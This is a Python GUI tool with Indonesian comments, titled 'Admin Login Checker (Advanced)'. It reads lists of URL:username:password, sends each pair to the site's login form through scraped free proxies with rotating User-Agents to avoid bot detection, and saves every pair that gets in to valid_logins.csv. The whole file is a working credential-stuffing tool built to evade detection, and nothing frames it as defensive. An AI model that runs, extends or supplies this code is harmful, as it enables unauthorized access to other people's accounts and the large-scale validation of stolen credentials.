import tkinter as tk
from tkinter import filedialog, scrolledtext, messagebox
import threading
import requests
from bs4 import BeautifulSoup
import random
import time
import csv

# Daftar User-Agent untuk menghindari deteksi bot
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
]

# Fungsi untuk mendapatkan proxy dari Free-Proxy-List.net
def get_proxies_from_web():
    url = 'https://free-proxy-list.net/'
    proxies = []
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')

        # Menemukan tabel dengan daftar proxy
        table = soup.find('table', {'id': 'proxylisttable'})
        rows = table.find_all('tr')

        for row in rows[1:]:  # Skip header row
            cols = row.find_all('td')
            if len(cols) > 0:
                ip = cols[0].text.strip()
                port = cols[1].text.strip()
                proxy = f'http://{ip}:{port}'
                proxies.append(proxy)

    except Exception as e:
        print(f"[!] Error fetching proxies: {e}")
    return proxies

# Fungsi untuk mendapatkan nama field dari form login
def get_form_fields(url, session, headers):
    try:
        response = session.get(url, headers=headers, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        form = soup.find('form')
        if form:
            inputs = form.find_all('input')
            fields = {}
            for input_tag in inputs:
                name = input_tag.get('name')
                if name:
                    fields[name] = input_tag.get('value', '')
            return fields
    except Exception as e:
        print(f"[!] Error getting form fields: {e}")
    return {}

# Fungsi untuk menguji login
def test_login(url, user, pwd, session, headers, form_fields):
    try:
        data = {**form_fields, 'username': user, 'password': pwd}
        response = session.post(url, data=data, headers=headers, timeout=10)
        if response.status_code == 200 and "dashboard" in response.text.lower():
            return True
    except Exception as e:
        print(f"[!] Error during login test: {e}")
    return False

# Fungsi untuk memproses daftar target
def process_targets(targets, output_area, proxy_list):
    with open("valid_logins.csv", "w", newline='') as csvfile:
        fieldnames = ['URL', 'Username', 'Password']
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()
        for line in targets:
            if not line.strip():
                continue
            try:
                url, user, pwd = line.strip().split(":")
                headers = {'User-Agent': random.choice(user_agents)}
                session = requests.Session()
                session.proxies = {
                    'http': random.choice(proxy_list),
                    'https': random.choice(proxy_list)
                }
                form_fields = get_form_fields(url, session, headers)
                if not form_fields:
                    output_area.insert(tk.END, f"[!] No form fields found for {url}\n")
                    output_area.see(tk.END)
                    continue
                result = f"[>] Trying: {url} | {user}:{pwd}\n"
                output_area.insert(tk.END, result)
                output_area.see(tk.END)
                if test_login(url, user, pwd, session, headers, form_fields):
                    success = f"[+] SUCCESS: {url} | {user}:{pwd}\n"
                    output_area.insert(tk.END, success)
                    output_area.see(tk.END)
                    writer.writerow({'URL': url, 'Username': user, 'Password': pwd})
                else:
                    output_area.insert(tk.END, f"[-] FAILED\n")
                    output_area.see(tk.END)
                time.sleep(1)
            except Exception as e:
                output_area.insert(tk.END, f"[!] Error: {str(e)}\n")
                output_area.see(tk.END)

# Fungsi untuk memulai pengecekan
def start_check(entry, output_area):
    raw = entry.get("1.0", tk.END).strip().split("\n")
    proxy_list = get_proxies_from_web()  # Ambil proxy dari Free-Proxy-List.net
    if not proxy_list:
        output_area.insert(tk.END, "[!] No proxies available. Exiting.\n")
        output_area.see(tk.END)
        return
    t = threading.Thread(target=process_targets, args=(raw, output_area, proxy_list))
    t.start()

# Fungsi untuk memuat file input
def load_file(entry):
    path = filedialog.askopenfilename()
    if path:
        with open(path, "r") as f:
            entry.insert(tk.END, f.read())

# Fungsi untuk membangun GUI
def build_gui():
    root = tk.Tk()
    root.title("🔐 Admin Login Checker (Advanced)")
    root.geometry("700x500")
    root.config(bg="#1e1e2e")

    label = tk.Label(root, text="Input target (format: URL:username:password)", bg="#1e1e2e", fg="white")
    label.pack(pady=5)

    entry = scrolledtext.ScrolledText(root, width=80, height=10, bg="#2d2d40", fg="white")
    entry.pack(pady=5)

    btn_frame = tk.Frame(root, bg="#1e1e2e")
    btn_frame.pack()

    tk.Button(btn_frame, text="📂 Load Target List", command=lambda: load_file(entry), bg="#4e4ef2", fg="white").pack(side=tk.LEFT, padx=5)
    tk.Button(btn_frame, text="🚀 Start Check", command=lambda: start_check(entry, output_area), bg="#22bb33", fg="white").pack(side=tk.LEFT, padx=5)

    output_area = scrolledtext.ScrolledText(root, width=80, height=15, bg="#1d1d2a", fg="lime")
    output_area.pack(pady=10)

    root.mainloop()

if __name__ == '__main__':
    build_gui()
